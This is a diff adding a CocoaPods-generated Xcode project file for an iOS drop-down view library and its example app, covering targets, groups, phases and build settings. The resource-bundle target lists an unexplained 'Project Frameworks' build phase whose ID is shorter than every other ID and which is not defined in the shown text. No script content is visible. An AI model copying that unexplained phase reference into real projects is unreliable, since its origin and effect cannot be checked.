@@ -1,0 +1,744 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 46;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		0947D4C097E8BE71338185AFFF244B9F /* UIKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = D245E0514AAC1A2B9A6D5EA2F383E90F /* UIKit.framework */; };
+		2A2321B7C82B558B383AD144A2B89A39 /* DKDropDownView-umbrella.h in Headers */ = {isa = PBXBuildFile; fileRef = 2D912CE651D6F88E6A3426D942486E76 /* DKDropDownView-umbrella.h */; settings = {ATTRIBUTES = (Public, ); }; };
+		2C236356808AD5102E33E338A860F17F /* DKDropDownView-dummy.m in Sources */ = {isa = PBXBuildFile; fileRef = D93348E2C57867C1B3D0D3046AB4741C /* DKDropDownView-dummy.m */; };
+		310ABA6AF68C4769ACCC693F8E85EF4B /* Foundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = EAB6F611E86A4758835A715E4B4184F6 /* Foundation.framework */; };
+		473070BB54B6804BBFEEAB922618E9F7 /* DKDropDownView.bundle in Resources */ = {isa = PBXBuildFile; fileRef = 044DF36740B84209DFF5BABE6680E38E /* DKDropDownView.bundle */; };
+		8CE4382BABC2A60F0630435740316EA6 /* Pods-DKDropDownView_Example-umbrella.h in Headers */ = {isa = PBXBuildFile; fileRef = 61A9183AA81D9815D0BE20E790BA8B37 /* Pods-DKDropDownView_Example-umbrella.h */; settings = {ATTRIBUTES = (Public, ); }; };
+		B9C4FD35B787F3B8D875B2DF1A19AFF0 /* Foundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = EAB6F611E86A4758835A715E4B4184F6 /* Foundation.framework */; };
+		C6A9871A5659DCB6167360AFDE75F2FA /* DKDropDownView.xib in Resources */ = {isa = PBXBuildFile; fileRef = FFC4638422C6D9383886AE1F20D9F0EB /* DKDropDownView.xib */; };
+		CBF30DBB029103B196803D61B04A7DB4 /* DKDropDownView.swift in Sources */ = {isa = PBXBuildFile; fileRef = CD208AF8DBFADE56D718385667433D3F /* DKDropDownView.swift */; };
+		E90E3E93805F77034644159A3FF207E1 /* Pods-DKDropDownView_Example-dummy.m in Sources */ = {isa = PBXBuildFile; fileRef = 30B4FBD1FEC39393C15927B2E2DB7B43 /* Pods-DKDropDownView_Example-dummy.m */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		0C70DA20D8D96AE0017481A6A87CD4A8 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = BFDFE7DC352907FC980B868725387E98 /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 20C37510C99D7DF35942CDD2056651DA;
+			remoteInfo = "DKDropDownView-DKDropDownView";
+		};
+		337266FC29348F943266D3B8D2A70156 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = BFDFE7DC352907FC980B868725387E98 /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = F491D440D962CFF041FBC9BF469F6C2C;
+			remoteInfo = DKDropDownView;
+		};
+/* End PBXContainerItemProxy section */
+
+/* Begin PBXFileReference section */
+		044DF36740B84209DFF5BABE6680E38E /* DKDropDownView.bundle */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; name = DKDropDownView.bundle; path = "DKDropDownView-DKDropDownView.bundle"; sourceTree = BUILT_PRODUCTS_DIR; };
+		0F5A062476257319F59A74D21211F517 /* DKDropDownView.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; path = DKDropDownView.debug.xcconfig; sourceTree = "<group>"; };
+		1287ED886835758E79609D66F29C4479 /* Pods-DKDropDownView_Example-Info.plist */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.plist.xml; path = "Pods-DKDropDownView_Example-Info.plist"; sourceTree = "<group>"; };
+		2D912CE651D6F88E6A3426D942486E76 /* DKDropDownView-umbrella.h */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.h; path = "DKDropDownView-umbrella.h"; sourceTree = "<group>"; };
+		302CAD6184C243A4D4FA35F02DE13B0D /* Pods-DKDropDownView_Example-frameworks.sh */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.script.sh; path = "Pods-DKDropDownView_Example-frameworks.sh"; sourceTree = "<group>"; };
+		3034D3A9F1EE0D81435CB3323240BF21 /* DKDropDownView.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; path = DKDropDownView.release.xcconfig; sourceTree = "<group>"; };
+		30B4FBD1FEC39393C15927B2E2DB7B43 /* Pods-DKDropDownView_Example-dummy.m */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.objc; path = "Pods-DKDropDownView_Example-dummy.m"; sourceTree = "<group>"; };
+		5A598809D797EE716AC2F6771F16754A /* Pods-DKDropDownView_Example.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; path = "Pods-DKDropDownView_Example.debug.xcconfig"; sourceTree = "<group>"; };
+		5E866B20FC496C283068A18E9E23D977 /* DKDropDownView.podspec */ = {isa = PBXFileReference; explicitFileType = text.script.ruby; includeInIndex = 1; indentWidth = 2; lastKnownFileType = text; path = DKDropDownView.podspec; sourceTree = "<group>"; tabWidth = 2; xcLanguageSpecificationIdentifier = xcode.lang.ruby; };
+		61A9183AA81D9815D0BE20E790BA8B37 /* Pods-DKDropDownView_Example-umbrella.h */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.h; path = "Pods-DKDropDownView_Example-umbrella.h"; sourceTree = "<group>"; };
+		722586F8EC5AABCAFFC70B7EAE2AD652 /* DKDropDownView-prefix.pch */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.h; path = "DKDropDownView-prefix.pch"; sourceTree = "<group>"; };
+		74D627ECBF593818BD0BCDA78BF00FB2 /* README.md */ = {isa = PBXFileReference; includeInIndex = 1; path = README.md; sourceTree = "<group>"; };
+		9D940727FF8FB9C785EB98E56350EF41 /* Podfile */ = {isa = PBXFileReference; explicitFileType = text.script.ruby; includeInIndex = 1; indentWidth = 2; lastKnownFileType = text; name = Podfile; path = ../Podfile; sourceTree = SOURCE_ROOT; tabWidth = 2; xcLanguageSpecificationIdentifier = xcode.lang.ruby; };
+		A47579943D5245F6BCAB2A5F84B730B5 /* DKDropDownView.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; name = DKDropDownView.framework; path = DKDropDownView.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		A552899227207DFEE861120B9C6C5DC1 /* Pods-DKDropDownView_Example.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; path = "Pods-DKDropDownView_Example.release.xcconfig"; sourceTree = "<group>"; };
+		A6C583A52A5D883C296A897E45D62FB3 /* DKDropDownView.modulemap */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.module; path = DKDropDownView.modulemap; sourceTree = "<group>"; };
+		B47C993A10FACBE3F90E5161DB055965 /* LICENSE */ = {isa = PBXFileReference; includeInIndex = 1; path = LICENSE; sourceTree = "<group>"; };
+		B6B3AD9CF91426B7AD7827B38832F07A /* Pods-DKDropDownView_Example-acknowledgements.markdown */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text; path = "Pods-DKDropDownView_Example-acknowledgements.markdown"; sourceTree = "<group>"; };
+		BA23695D858BCE176ADF3D7432CB801A /* DKDropDownView-Info.plist */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.plist.xml; path = "DKDropDownView-Info.plist"; sourceTree = "<group>"; };
+		CD208AF8DBFADE56D718385667433D3F /* DKDropDownView.swift */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.swift; name = DKDropDownView.swift; path = DKDropDownView/Classes/DKDropDownView.swift; sourceTree = "<group>"; };
+		D245E0514AAC1A2B9A6D5EA2F383E90F /* UIKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = UIKit.framework; path = Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS14.0.sdk/System/Library/Frameworks/UIKit.framework; sourceTree = DEVELOPER_DIR; };
+		D38A5A29A8A6CC2D52B7AD30555E4242 /* Pods-DKDropDownView_Example.modulemap */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.module; path = "Pods-DKDropDownView_Example.modulemap"; sourceTree = "<group>"; };
+		D8BAEB29405F604A86E7F127F5656E5D /* Pods_DKDropDownView_Example.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; name = Pods_DKDropDownView_Example.framework; path = "Pods-DKDropDownView_Example.framework"; sourceTree = BUILT_PRODUCTS_DIR; };
+		D93348E2C57867C1B3D0D3046AB4741C /* DKDropDownView-dummy.m */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.objc; path = "DKDropDownView-dummy.m"; sourceTree = "<group>"; };
+		EAB6F611E86A4758835A715E4B4184F6 /* Foundation.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Foundation.framework; path = Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS14.0.sdk/System/Library/Frameworks/Foundation.framework; sourceTree = DEVELOPER_DIR; };
+		F3D32381AA033F188A1B145D1406CBF6 /* Pods-DKDropDownView_Example-acknowledgements.plist */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.plist.xml; path = "Pods-DKDropDownView_Example-acknowledgements.plist"; sourceTree = "<group>"; };
+		FECA313041D429EB87D04E9C8E46E1D7 /* ResourceBundle-DKDropDownView-DKDropDownView-Info.plist */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.plist.xml; path = "ResourceBundle-DKDropDownView-DKDropDownView-Info.plist"; sourceTree = "<group>"; };
+		FFC4638422C6D9383886AE1F20D9F0EB /* DKDropDownView.xib */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = file.xib; name = DKDropDownView.xib; path = DKDropDownView/Assets/DKDropDownView.xib; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		7D88A64F2EED689A2330AA2A7955A22E /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				B9C4FD35B787F3B8D875B2DF1A19AFF0 /* Foundation.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		BA19051D83A35C3774282774045FD7D9 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				310ABA6AF68C4769ACCC693F8E85EF4B /* Foundation.framework in Frameworks */,
+				0947D4C097E8BE71338185AFFF244B9F /* UIKit.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		D23DA947771DBFFFC478837CF619ED0B /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		029E107DA43DEFD6257400E7FD0246F8 /* DKDropDownView */ = {
+			isa = PBXGroup;
+			children = (
+				CD208AF8DBFADE56D718385667433D3F /* DKDropDownView.swift */,
+				FFC4638422C6D9383886AE1F20D9F0EB /* DKDropDownView.xib */,
+				C32C522217212DD842C03A89A1E3F724 /* Pod */,
+				9CB133626F48EFE6449E071413C4983B /* Support Files */,
+			);
+			name = DKDropDownView;
+			path = ../..;
+			sourceTree = "<group>";
+		};
+		1628BF05B4CAFDCC3549A101F5A10A17 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				59DA5C1F72E1D5BABC43EACBA672C3BA /* iOS */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		2CF2A6AAFA61CE3FA0E0041EC56FAED2 /* Targets Support Files */ = {
+			isa = PBXGroup;
+			children = (
+				6CE47A1CFC21DC7C31E18B369C30D706 /* Pods-DKDropDownView_Example */,
+			);
+			name = "Targets Support Files";
+			sourceTree = "<group>";
+		};
+		487B27F47F6A88FAC4743D0BA89EEA85 /* Development Pods */ = {
+			isa = PBXGroup;
+			children = (
+				029E107DA43DEFD6257400E7FD0246F8 /* DKDropDownView */,
+			);
+			name = "Development Pods";
+			sourceTree = "<group>";
+		};
+		59DA5C1F72E1D5BABC43EACBA672C3BA /* iOS */ = {
+			isa = PBXGroup;
+			children = (
+				EAB6F611E86A4758835A715E4B4184F6 /* Foundation.framework */,
+				D245E0514AAC1A2B9A6D5EA2F383E90F /* UIKit.framework */,
+			);
+			name = iOS;
+			sourceTree = "<group>";
+		};
+		6CE47A1CFC21DC7C31E18B369C30D706 /* Pods-DKDropDownView_Example */ = {
+			isa = PBXGroup;
+			children = (
+				D38A5A29A8A6CC2D52B7AD30555E4242 /* Pods-DKDropDownView_Example.modulemap */,
+				B6B3AD9CF91426B7AD7827B38832F07A /* Pods-DKDropDownView_Example-acknowledgements.markdown */,
+				F3D32381AA033F188A1B145D1406CBF6 /* Pods-DKDropDownView_Example-acknowledgements.plist */,
+				30B4FBD1FEC39393C15927B2E2DB7B43 /* Pods-DKDropDownView_Example-dummy.m */,
+				302CAD6184C243A4D4FA35F02DE13B0D /* Pods-DKDropDownView_Example-frameworks.sh */,
+				1287ED886835758E79609D66F29C4479 /* Pods-DKDropDownView_Example-Info.plist */,
+				61A9183AA81D9815D0BE20E790BA8B37 /* Pods-DKDropDownView_Example-umbrella.h */,
+				5A598809D797EE716AC2F6771F16754A /* Pods-DKDropDownView_Example.debug.xcconfig */,
+				A552899227207DFEE861120B9C6C5DC1 /* Pods-DKDropDownView_Example.release.xcconfig */,
+			);
+			name = "Pods-DKDropDownView_Example";
+			path = "Target Support Files/Pods-DKDropDownView_Example";
+			sourceTree = "<group>";
+		};
+		8C42A730A6DA8358E8091E8C2D9ECFAB /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				044DF36740B84209DFF5BABE6680E38E /* DKDropDownView.bundle */,
+				A47579943D5245F6BCAB2A5F84B730B5 /* DKDropDownView.framework */,
+				D8BAEB29405F604A86E7F127F5656E5D /* Pods_DKDropDownView_Example.framework */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		9CB133626F48EFE6449E071413C4983B /* Support Files */ = {
+			isa = PBXGroup;
+			children = (
+				A6C583A52A5D883C296A897E45D62FB3 /* DKDropDownView.modulemap */,
+				D93348E2C57867C1B3D0D3046AB4741C /* DKDropDownView-dummy.m */,
+				BA23695D858BCE176ADF3D7432CB801A /* DKDropDownView-Info.plist */,
+				722586F8EC5AABCAFFC70B7EAE2AD652 /* DKDropDownView-prefix.pch */,
+				2D912CE651D6F88E6A3426D942486E76 /* DKDropDownView-umbrella.h */,
+				0F5A062476257319F59A74D21211F517 /* DKDropDownView.debug.xcconfig */,
+				3034D3A9F1EE0D81435CB3323240BF21 /* DKDropDownView.release.xcconfig */,
+				FECA313041D429EB87D04E9C8E46E1D7 /* ResourceBundle-DKDropDownView-DKDropDownView-Info.plist */,
+			);
+			name = "Support Files";
+			path = "Example/Pods/Target Support Files/DKDropDownView";
+			sourceTree = "<group>";
+		};
+		C32C522217212DD842C03A89A1E3F724 /* Pod */ = {
+			isa = PBXGroup;
+			children = (
+				5E866B20FC496C283068A18E9E23D977 /* DKDropDownView.podspec */,
+				B47C993A10FACBE3F90E5161DB055965 /* LICENSE */,
+				74D627ECBF593818BD0BCDA78BF00FB2 /* README.md */,
+			);
+			name = Pod;
+			sourceTree = "<group>";
+		};
+		CF1408CF629C7361332E53B88F7BD30C = {
+			isa = PBXGroup;
+			children = (
+				9D940727FF8FB9C785EB98E56350EF41 /* Podfile */,
+				487B27F47F6A88FAC4743D0BA89EEA85 /* Development Pods */,
+				1628BF05B4CAFDCC3549A101F5A10A17 /* Frameworks */,
+				8C42A730A6DA8358E8091E8C2D9ECFAB /* Products */,
+				2CF2A6AAFA61CE3FA0E0041EC56FAED2 /* Targets Support Files */,
+			);
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXHeadersBuildPhase section */
+		0873E309010BF589DFBE4C83266AB1F6 /* Headers */ = {
+			isa = PBXHeadersBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				8CE4382BABC2A60F0630435740316EA6 /* Pods-DKDropDownView_Example-umbrella.h in Headers */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		FA834B5FB21ABEC3470637D10C396896 /* Headers */ = {
+			isa = PBXHeadersBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				2A2321B7C82B558B383AD144A2B89A39 /* DKDropDownView-umbrella.h in Headers */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXHeadersBuildPhase section */
+
+/* Begin PBXNativeTarget section */
+		20C37510C99D7DF35942CDD2056651DA /* DKDropDownView-DKDropDownView */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 5C17CEBCEE283DE25C0F1553014EA7FA /* Build configuration list for PBXNativeTarget "DKDropDownView-DKDropDownView" */;
+			buildPhases = (
+				06DFC843C7A8CDACBD6D902C /* Project Frameworks */,
+				0BFFBCD492C06B49A75979667D3EA242 /* Sources */,
+				D23DA947771DBFFFC478837CF619ED0B /* Frameworks */,
+				281C05260A5AC5C0C81D7FC80458806E /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = "DKDropDownView-DKDropDownView";
+			productName = "DKDropDownView-DKDropDownView";
+			productReference = 044DF36740B84209DFF5BABE6680E38E /* DKDropDownView.bundle */;
+			productType = "com.apple.product-type.bundle";
+		};
+		410D68376A90CE19129B7721C2E33CAC /* Pods-DKDropDownView_Example */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = AA0AB2E73472E7B2BAB801CA538C22B4 /* Build configuration list for PBXNativeTarget "Pods-DKDropDownView_Example" */;
+			buildPhases = (
+				0873E309010BF589DFBE4C83266AB1F6 /* Headers */,
+				3FCFEA11D52F93F3DD246CA70A801122 /* Sources */,
+				7D88A64F2EED689A2330AA2A7955A22E /* Frameworks */,
+				D9BF439B885308F46F92E80A91B201C6 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				0E99F5514A747D053D8B1C47B06763A4 /* PBXTargetDependency */,
+			);
+			name = "Pods-DKDropDownView_Example";
+			productName = "Pods-DKDropDownView_Example";
+			productReference = D8BAEB29405F604A86E7F127F5656E5D /* Pods_DKDropDownView_Example.framework */;
+			productType = "com.apple.product-type.framework";
+		};
+		F491D440D962CFF041FBC9BF469F6C2C /* DKDropDownView */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 3BA37BAF9261D39E9B8EEF38E211497D /* Build configuration list for PBXNativeTarget "DKDropDownView" */;
+			buildPhases = (
+				FA834B5FB21ABEC3470637D10C396896 /* Headers */,
+				DD8BC63C5FBD2811345BED94A2392F23 /* Sources */,
+				BA19051D83A35C3774282774045FD7D9 /* Frameworks */,
+				DED7134F410D39F0F1C8F79C3CBAC1C6 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				0C462A12DD42C2AD885246A31A4FAD10 /* PBXTargetDependency */,
+			);
+			name = DKDropDownView;
+			productName = DKDropDownView;
+			productReference = A47579943D5245F6BCAB2A5F84B730B5 /* DKDropDownView.framework */;
+			productType = "com.apple.product-type.framework";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		BFDFE7DC352907FC980B868725387E98 /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				LastSwiftUpdateCheck = 1100;
+				LastUpgradeCheck = 1100;
+			};
+			buildConfigurationList = 4821239608C13582E20E6DA73FD5F1F9 /* Build configuration list for PBXProject "Pods" */;
+			compatibilityVersion = "Xcode 3.2";
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = CF1408CF629C7361332E53B88F7BD30C;
+			productRefGroup = 8C42A730A6DA8358E8091E8C2D9ECFAB /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				F491D440D962CFF041FBC9BF469F6C2C /* DKDropDownView */,
+				20C37510C99D7DF35942CDD2056651DA /* DKDropDownView-DKDropDownView */,
+				410D68376A90CE19129B7721C2E33CAC /* Pods-DKDropDownView_Example */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		281C05260A5AC5C0C81D7FC80458806E /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				C6A9871A5659DCB6167360AFDE75F2FA /* DKDropDownView.xib in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		D9BF439B885308F46F92E80A91B201C6 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		DED7134F410D39F0F1C8F79C3CBAC1C6 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				473070BB54B6804BBFEEAB922618E9F7 /* DKDropDownView.bundle in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		0BFFBCD492C06B49A75979667D3EA242 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		3FCFEA11D52F93F3DD246CA70A801122 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				E90E3E93805F77034644159A3FF207E1 /* Pods-DKDropDownView_Example-dummy.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		DD8BC63C5FBD2811345BED94A2392F23 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				2C236356808AD5102E33E338A860F17F /* DKDropDownView-dummy.m in Sources */,
+				CBF30DBB029103B196803D61B04A7DB4 /* DKDropDownView.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		0C462A12DD42C2AD885246A31A4FAD10 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = "DKDropDownView-DKDropDownView";
+			target = 20C37510C99D7DF35942CDD2056651DA /* DKDropDownView-DKDropDownView */;
+			targetProxy = 0C70DA20D8D96AE0017481A6A87CD4A8 /* PBXContainerItemProxy */;
+		};
+		0E99F5514A747D053D8B1C47B06763A4 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = DKDropDownView;
+			target = F491D440D962CFF041FBC9BF469F6C2C /* DKDropDownView */;
+			targetProxy = 337266FC29348F943266D3B8D2A70156 /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin XCBuildConfiguration section */
+		07EE781AA51D822C21A1CFE847BC624C /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 3034D3A9F1EE0D81435CB3323240BF21 /* DKDropDownView.release.xcconfig */;
+			buildSettings = {
+				CONFIGURATION_BUILD_DIR = "$(BUILD_DIR)/$(CONFIGURATION)$(EFFECTIVE_PLATFORM_NAME)/DKDropDownView";
+				IBSC_MODULE = DKDropDownView;
+				INFOPLIST_FILE = "Target Support Files/DKDropDownView/ResourceBundle-DKDropDownView-DKDropDownView-Info.plist";
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
+				PRODUCT_NAME = DKDropDownView;
+				SDKROOT = iphoneos;
+				SKIP_INSTALL = YES;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				WRAPPER_EXTENSION = bundle;
+			};
+			name = Release;
+		};
+		25AD9454612BF454A1E3DC4CD4FA8C6D /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"POD_CONFIGURATION_DEBUG=1",
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				STRIP_INSTALLED_PRODUCT = NO;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+				SWIFT_VERSION = 5.0;
+				SYMROOT = "${SRCROOT}/../build";
+			};
+			name = Debug;
+		};
+		2E091BC2D4E02112CB5E73E9724279B0 /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 3034D3A9F1EE0D81435CB3323240BF21 /* DKDropDownView.release.xcconfig */;
+			buildSettings = {
+				CLANG_ENABLE_OBJC_WEAK = NO;
+				"CODE_SIGN_IDENTITY[sdk=appletvos*]" = "";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "";
+				"CODE_SIGN_IDENTITY[sdk=watchos*]" = "";
+				CURRENT_PROJECT_VERSION = 1;
+				DEFINES_MODULE = YES;
+				DYLIB_COMPATIBILITY_VERSION = 1;
+				DYLIB_CURRENT_VERSION = 1;
+				DYLIB_INSTALL_NAME_BASE = "@rpath";
+				GCC_PREFIX_HEADER = "Target Support Files/DKDropDownView/DKDropDownView-prefix.pch";
+				INFOPLIST_FILE = "Target Support Files/DKDropDownView/DKDropDownView-Info.plist";
+				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
+				MODULEMAP_FILE = "Target Support Files/DKDropDownView/DKDropDownView.modulemap";
+				PRODUCT_MODULE_NAME = DKDropDownView;
+				PRODUCT_NAME = DKDropDownView;
+				SDKROOT = iphoneos;
+				SKIP_INSTALL = YES;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "$(inherited) ";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				VALIDATE_PRODUCT = YES;
+				VERSIONING_SYSTEM = "apple-generic";
+				VERSION_INFO_PREFIX = "";
+			};
+			name = Release;
+		};
+		43E39812843C9851A269F9B52949CDFA /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 0F5A062476257319F59A74D21211F517 /* DKDropDownView.debug.xcconfig */;
+			buildSettings = {
+				CLANG_ENABLE_OBJC_WEAK = NO;
